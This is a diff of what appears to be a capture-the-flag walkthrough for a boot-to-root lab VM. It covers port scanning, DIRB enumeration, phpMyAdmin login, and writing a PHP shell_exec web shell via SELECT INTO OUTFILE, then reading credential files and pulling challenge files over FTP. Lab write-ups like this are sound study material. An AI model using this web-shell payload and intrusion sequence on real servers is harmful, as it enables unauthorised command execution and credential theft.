@@ -27,6 +27,7 @@ We receive available ports on the system. Our output:
 > 443/tcp open  https
 > 993/tcp open  imaps
 
+We have several open ports through which we can try to hack the system.
 
 We have an open http port (80) for 10.111.1.24. So we can look for existing Web Objects. To do it we use DIRB package (github.com/v0re/dirb.git). To install it (if not yet installed) just clone the repo and "make" the programm:
 
@@ -68,11 +69,42 @@ We can try to use this login and password to acces the third directory found usi
 Login successful. 
 
 PHP-MyAdmin is a GUI based interface for MySQL database. Next step we will to try to attack this database to access shell.
-We will use command shell_exec — Execute command via shell and return the complete output as a string. The result we will output in the templates_c folder. Type in the window for SQL queries:
+We will use command shell_exec — Execute command via shell and return the complete output as a string. 
+The problem is where to store the output. We will use all the directories found using DIRB tool earlier:
 
-SELECT "<?php echo shell_exec($_GET['cmd']); ?> " INTO OUTFILE "/var/www/forum/templates_c/2.php"
 
-Output will be on page https://10.111.1.24/forum/templates_c/1.php
+
+SELECT "<?php echo shell_exec($_GET['cmd']); ?> " INTO OUTFILE "/var/www/forum/1.php"
+
+> #1 - Can't create/write to file '/var/www/forum/1.php' (Errcode: 13)
+
+SELECT "<?php echo shell_exec($_GET['cmd']); ?> " INTO OUTFILE "/var/www/phpmyadmin/1.php"
+
+> #1 - Can't create/write to file '/var/www/phpmyadmin/1.php' (Errcode: 2)
+
+SELECT "<?php echo shell_exec($_GET['cmd']); ?> " INTO OUTFILE "/var/www/webmail/1.php"
+
+> #1 - Can't create/write to file '/var/www/webmail/1.php' (Errcode: 2)
+
+SELECT "<?php echo shell_exec($_GET['cmd']); ?> " INTO OUTFILE "/var/www/forum/js/1.php"
+
+> #1 - Can't create/write to file '/var/www/forum/js/1.php' (Errcode: 13)
+
+SELECT "<?php echo shell_exec($_GET['cmd']); ?> " INTO OUTFILE "/var/www/forum/lang/1.php"
+
+> #1 - Can't create/write to file '/var/www/forum/lang/1.php' (Errcode: 13)
+
+SELECT "<?php echo shell_exec($_GET['cmd']); ?> " INTO OUTFILE "/var/www/forum/modules/1.php"
+
+> #1 - Can't create/write to file '/var/www/forum/modules/1.php' (Errcode: 13)
+
+SELECT "<?php echo shell_exec($_GET['cmd']); ?> " INTO OUTFILE "/var/www/forum/templates_c/1.php"
+
+> Your SQL query has been executed successfully ( Query took 0.0001 sec )
+
+
+
+Successful. The output was stored on https://10.111.1.24/forum/templates_c/1.php in templates_c folder.
 
 We can add shell commands to the end of the address string and get its output on this page. 
 
@@ -84,7 +116,7 @@ The output is:
 
 > LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz
 
-We have there seven directories: LOOKATME, ft_root, laurie, laurie@borntosec.net, lmezard, thor, zaz. Let's look what we have inside them. 
+We have there seven directories: LOOKATME, ft_root, laurie, laurie@borntosec.net, lmezard, thor, zaz. Let's look what we have inside them.
 
 In the directory LOOKATME there is a file "password". Other directories are empty. Lets look what is inside the "password" file. Type after the address string:
 
@@ -96,4 +128,84 @@ lmezard:G!@M6f4Eatau{sF"
 
 So we have login and password: lmezard	G!@M6f4Eatau{sF"
 
+
+Now we can try to connect through ssh or ftp ports using obtained login and password. For these proposes we need installed inetutils tool:
+
 "brew install inetutils"
+
+"ftp 10.111.1.24"
+
+It requires Name and Password. Try to login. 
+
+> 230 Login successful.
+
+Here we have 2 files: 
+
+
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
+-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
+226 Directory send OK.
+
+
+Let's download these files:
+
+ftp> get README
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for README (96 bytes).
+WARNING! 1 bare linefeeds received in ASCII mode
+File may not have transferred correctly.
+226 Transfer complete.
+96 bytes received in 0.000158 seconds (593 kbytes/s)
+ftp> get fun
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for fun (808960 bytes).
+WARNING! 2764 bare linefeeds received in ASCII mode
+File may not have transferred correctly.
+226 Transfer complete.
+808960 bytes received in 0.089 seconds (8.67 Mbytes/s)
+ftp> quit
+221 Goodbye.
+
+
+Let's check what types of files do we have. Use command "file" to understand it:
+
+"file README"
+
+> README: ASCII text
+
+"file fun"
+
+> fun: POSIX tar archive (GNU)
+
+
+Inside README file we have the following information:
+
+"cat README"
+
+> Complete this little challenge and use the result as password for user 'laurie' to login in ssh
+
+
+We see that the other file is an archive. Untar it using "tar -xvf" command:
+
+"tar -xvf fun"
+
+As a result, we have the directory ft_fun.
+
+"cd ft_fun"
+"ls -l | wc"
+
+> 		751    6752   45011
+
+Here we have 751 files. Example:
+
+"cat 99VAL.pcap"
+
+
+> void useless() {
+
+> //file60%
+
+In every file we have a line of some code and the number of this file. We can guess that we can combine these files to have this code. First we need to arrange these files according their numbers in ascending order.
